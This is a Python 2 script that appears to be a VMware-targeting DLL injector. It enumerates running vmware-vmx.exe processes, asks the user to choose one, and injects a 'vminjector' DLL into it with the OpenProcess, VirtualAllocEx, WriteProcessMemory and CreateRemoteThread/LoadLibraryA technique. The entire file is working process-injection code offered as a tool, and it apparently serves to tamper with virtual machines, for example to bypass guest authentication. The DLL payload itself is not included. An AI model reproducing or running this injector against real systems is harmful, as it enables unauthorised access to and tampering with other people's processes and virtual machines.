import sys
from ctypes import *
import ctypes
import re
import psutil
import os

def InjectDLL(PID,DLL_PATH):
	PAGE_RW_PRIV     =     0x04
	PROCESS_ALL_ACCESS =     ( 0x000F0000 | 0x00100000 | 0xFFF )
	VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )

	kernel32 = windll.kernel32	
	print "[+] Starting DLL Injector"
	
	LEN_DLL = len(DLL_PATH)# get the length of the DLL PATH
	
	print "\t[+] Getting process handle for PID:%d " % PID 
	hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,PID)
	if hProcess == None:
		print "\t[+] Unable to get process handle"
		sys.exit(0)
	
	print "\t[+] Allocating space for DLL PATH"
	DLL_PATH_ADDR = kernel32.VirtualAllocEx(hProcess, 
											0,
											LEN_DLL,
											VIRTUAL_MEM,
											PAGE_RW_PRIV)
	
	bool_Written = c_int(0)
	print "\t[+] Writing DLL PATH to current process space"
	kernel32.WriteProcessMemory(hProcess,
								DLL_PATH_ADDR,
								DLL_PATH,
								LEN_DLL,
								byref(bool_Written))
								
								
	print "\t[+] Resolving Call Specific functions & libraries"

	kernel32DllHandler_addr = kernel32.GetModuleHandleA("kernel32")
	print "\t\t[+] Resolved kernel32 library at 0x%08x" % kernel32DllHandler_addr
	
	LoadLibraryA_func_addr = kernel32.GetProcAddress(kernel32DllHandler_addr,"LoadLibraryA")
	print "\t\t[+] Resolve LoadLibraryA function at 0x%08x" %LoadLibraryA_func_addr
	
	thread_id = c_ulong(0) # for our thread id
	print "\t[+] Creating Remote Thread to load our DLL"
	hThread=kernel32.CreateRemoteThread(hProcess,
								None,
								0,
								LoadLibraryA_func_addr,
								DLL_PATH_ADDR,
								0,
								byref(thread_id))
	if not hThread:
		print "[!] Injection Failed, exiting"
		sys.exit(0)
	else:
		print "[+] Remote Thread 0x%08x created, DLL code injected" % thread_id.value

	kernel32.WaitForSingleObject(hThread,9999999);
	kernel32.CloseHandle(hThread);
	print "[+] Closed Thread"

	
if __name__ == "__main__":
	targets=[]
	i=0
	
	if (str(ctypes.sizeof(ctypes.c_voidp))=='4'):
		print "Running on a x86 machine selecting DLL"
		dll_path = os.path.abspath("vminjector32.dll")
	else:
		print "Running on a x64 machine selecting DLL"
		dll_path = os.path.abspath("vminjector64.dll")

	print ('Configured DLL path to %s \n' % (dll_path))

	for process in psutil.process_iter(): 
		if(process.name == 'vmware-vmx.exe'):
			targets.append([])
			targets[i].append(process.name)
			targets[i].append(process.pid)
			for line in process.cmdline:
				if re.search( '\.vmx', line ):
					targets[i].append(line)
					i=i+1
				
	print "VMs Running:"
	if not targets:
		print "[!] No vmware-vmx.exe process running"
		sys.exit(0)
		
	i=0	
	for fire in targets:
		print "["+str(i)+"] Process: "+fire[0]+" PID: "+str(fire[1])+" VM Location: "+fire[2]
		i=i+1
	
	opt=-1;
	while (opt<0 or opt>=i):	
		opt = input('\nChoose a target: ')
	
	pid = targets[opt][1]
	InjectDLL(pid,dll_path)





